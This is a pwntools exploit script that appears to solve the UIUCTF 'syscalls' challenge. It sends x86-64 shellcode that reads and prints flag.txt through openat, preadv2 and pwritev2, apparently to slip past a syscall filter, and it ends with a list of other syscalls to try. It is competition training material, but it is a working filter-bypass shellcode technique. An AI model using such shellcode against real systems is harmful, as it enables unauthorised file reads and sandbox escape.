#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./syscalls --host syscalls.chal.uiuc.tf --port 1337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './syscalls')
context.terminal = ['tmux', 'splitw', '-h']
host = args.HOST or 'syscalls.chal.uiuc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = '''
b setvbuf
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments

io = start()
# offset to main (0x11c9)
# offset to exec (0x12d6)

ins="""
    // openat(-100, file, 0)
    mov rdi, -100  
    lea rsi, [rip+filename] 
    mov rdx, 0         
    mov r10, 0            
    mov rax, 257             
    syscall                  

    // preadv2(fd, iov, 1, 0, 0)
    mov rdi, rax
    mov rax, 327
    mov r10, rsp
    add r10, 0x100
    mov r11, 0x100
    push r11
    push r10
    mov rsi, rsp
    mov rdx, 1
    mov r10, 0
    syscall

    // pwritev2(1, iov, 1, -1, 0)
    mov rdi, 1  
    mov rdx, 1
    mov r10, -1
    mov r8, 0
    mov r9, 0
    mov rax, 328               
    syscall              

    filename:
        .string "./flag.txt"
"""

payload = asm(ins)

io.sendline(payload)

io.interactive()

"""
##### To Try
preadv2
openat
pwritev2


read
write
open
pread64
readv
preadv
sendfile
fork
execve
splice
pwritev
execveat
writev
"""